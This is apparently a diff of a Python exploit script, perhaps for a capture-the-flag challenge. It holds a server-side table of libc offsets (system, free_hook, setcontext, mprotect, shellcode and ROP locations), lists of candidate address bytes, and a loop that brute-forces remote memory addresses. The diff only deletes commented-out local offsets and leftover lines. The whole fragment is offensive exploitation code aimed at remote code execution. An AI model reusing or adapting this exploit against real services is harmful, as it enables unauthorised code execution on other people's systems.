@@ -44,18 +44,8 @@ def send_request(payload):
     return dsi_block + payload
 offset_table = {'system' : 0x4f440, 'free_hook' : 0x3ed8e8, 'rtld_lock_recursive': 0xed2f60, 
                                     "_dl_load_lock" : 0xed2968, "rop" : 0xed2968+0x100, "shellcode" : 0xed2968+0x200, "mprotect" : 0x11bae0,'setcontext_53':0x52070+53} # server
-#offset_table = {'system' : 0x04f4e0, 'free_hook' : 0x3ed8e8, 'rtld_lock_recursive': 0xed2f60, 
-#                                    "_dl_load_lock" : 0xed2968, "rop" : 0xed2968+0x100, "shellcode" : 0xed2968+0x200, "mprotect" : 0x11bc00,'setcontext_53':0x052145}
-# local
-# [['\x10'], ['\x10>', '\x10M', '\x10\\', '\x10k', '\x10z', '\x10\x89', '\x10\x98', '\x10\xa7', '\x10\xb6', '\x10\xc5', '\x10\xd4', '\x10\xe3', '\x10\xf2']]
-#cnt_list = [0x60,4,]
-#addr_list = [['\x10'], ['\x100'], ['\x100\xea'], ['\x100\xea\x91', '\x100\xea\x97'], ['\x100\xea\x91\xcb', '\x100\xea\x97\xcb'], ['\x100\xea\x91\xcb\x7f', '\x100\xea\x97\xcb\x7f']]
-# idx = 6
 idx = 2
 addr_list = [['\x10'], ['\x10\xa0'], ['\x10\xa03', '\x10\xa07', '\x10\xa0;', '\x10\xa0?'], ['\x10\xa03\xad', '\x10\xa03\xb3', '\x10\xa07\xad', '\x10\xa07\xb3', '\x10\xa0;\xad', '\x10\xa0;\xb3', '\x10\xa0?\xad', '\x10\xa0?\xb3'], ['\x10\xa03\xad\xde', '\x10\xa03\xb3\xde', '\x10\xa07\xad\xde', '\x10\xa07\xb3\xde', '\x10\xa0;\xad\xde', '\x10\xa0;\xb3\xde', '\x10\xa0?\xad\xde', '\x10\xa0?\xb3\xde'], ['\x10\xa03\xad\xde\x7f', '\x10\xa03\xb3\xde\x7f', '\x10\xa07\xad\xde\x7f', '\x10\xa07\xb3\xde\x7f', '\x10\xa0;\xad\xde\x7f', '\x10\xa0;\xb3\xde\x7f', '\x10\xa0?\xad\xde\x7f', '\x10\xa0?\xb3\xde\x7f']]
-#addr_list =[['\x10'],['\x10\x00']]
-0x7f10be421010
-0x7f10bd77e000
 
 while len(addr_list) <  6:
     addr_list.append(list())
@@ -99,7 +89,6 @@ addrlist = [0xdeb344a010,0xdead44a010,0xdeb343a010,0xdead43a010,0xdeb342a010,0xd
 0xdeb33fa010,0xdead3fa010,0xdeb33ea010,0xdeae3ea010,0xdead3ea010,0xdeb33da010,0xdead3da010,0xdeb33ca010,0xdead3ca010,0xdeb33ba010,
 0xdead3ba010,0xdeb33aa010,0xdead3aa010,0xdeb339a010,0xdead39a010,0xdeb338a010,0xdead38a010,0xdeb337a010,0xdead37a010,0xdeb336a010,
 0xdead36a010,0xdeb335a010,0xdead35a010,0xdeb334a010,0xdead34a010,0xdeb333a010,0xdead33a010] #server
-#addrlist = [0x5afd461010]
 for i in addrlist:
     for j in range(0x100):
         command_addr = i+0x7f0000000000 - j*0x1000
